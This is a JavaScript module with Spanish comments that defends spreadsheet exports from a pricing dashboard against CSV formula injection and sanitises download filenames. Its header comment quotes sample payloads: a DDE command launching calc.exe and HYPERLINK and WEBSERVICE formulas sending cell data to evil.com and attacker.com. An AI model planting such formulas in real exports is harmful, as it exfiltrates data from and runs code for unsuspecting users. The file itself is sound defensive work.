// ════════════════════════════════════════════════════════════════════════
// csvSafety — defensa contra "CSV injection" / "formula injection".
//
// EL ATAQUE:
//   Si un valor de una celda empieza con =, +, -, @, \t o \r, Excel /
//   Google Sheets / LibreOffice lo INTERPRETA como fórmula cuando el
//   usuario abre el archivo. Un valor crafteado como:
//     =cmd|' /c calc.exe'!A0
//     =HYPERLINK("https://evil.com?q="&A1, "click me")
//     =WEBSERVICE("https://attacker.com/" & A1)
//   exfiltra data, ejecuta binarios (Excel pre-2016) o hace SSRF.
//
//   En Yango pricing CI el riesgo es BAJO hoy porque:
//   - Los strings vienen de tablas DB con whitelist (city/category fijos).
//   - Los números van toFixed() → nunca empiezan con =/+/-/@.
//
//   Pero si en el futuro agregamos campos libres (notes, custom labels),
//   un atacante con acceso de write podría plantar un payload que se
//   ejecuta cuando otro user abre el export. Por eso lo prevenimos ahora.
//
// LA DEFENSA (recomendación OWASP):
//   Prefijar con comilla simple (') cualquier valor que empieza con un
//   carácter "peligroso". Excel muestra el valor literal y NO lo evalúa.
//   La comilla NO aparece visualmente en la celda (Excel la oculta).
//
//   También collapseamos \t/\r al inicio porque algunos parsers de CSV
//   tratan tab/CR como separadores y permiten payload injection.
// ════════════════════════════════════════════════════════════════════════

const DANGEROUS_PREFIX = /^[=+\-@\t\r]/

/**
 * Prefija con ' los strings que arrancan con un carácter peligroso.
 * Pasthrough para number / boolean / null / undefined / objetos no-string.
 *
 * @param {unknown} value
 * @returns {unknown}
 */
export function sanitizeForSpreadsheet(value) {
  if (value == null) return value
  if (typeof value !== 'string') return value
  if (DANGEROUS_PREFIX.test(value)) {
    return `'${value}`
  }
  return value
}

/**
 * Variante para CSV (no Excel binario): además del prefix de seguridad,
 * envuelve el valor en comillas dobles si contiene coma, comilla o salto
 * de línea (RFC 4180), y escapa las comillas dobles internas.
 *
 * @param {unknown} value
 * @returns {string}
 */
export function escapeCsvCell(value) {
  if (value == null) return ''
  let s = String(value)
  if (DANGEROUS_PREFIX.test(s)) s = `'${s}`
  if (/[,"\n\r]/.test(s)) {
    s = `"${s.replace(/"/g, '""')}"`
  }
  return s
}

/**
 * Sanea un valor para usarlo en el nombre de archivo de una descarga.
 * Categorías reales de este dashboard incluyen '/' (ej. "Economy/Comfort") —
 * sin esto, el navegador puede guardar el archivo en una subcarpeta
 * inesperada o truncar el nombre en vez del archivo que el usuario espera.
 *
 * @param {unknown} value
 * @returns {string}
 */
export function sanitizeForFilename(value) {
  return String(value ?? '').replace(/[/\\?%*:|"<>]/g, '-')
}
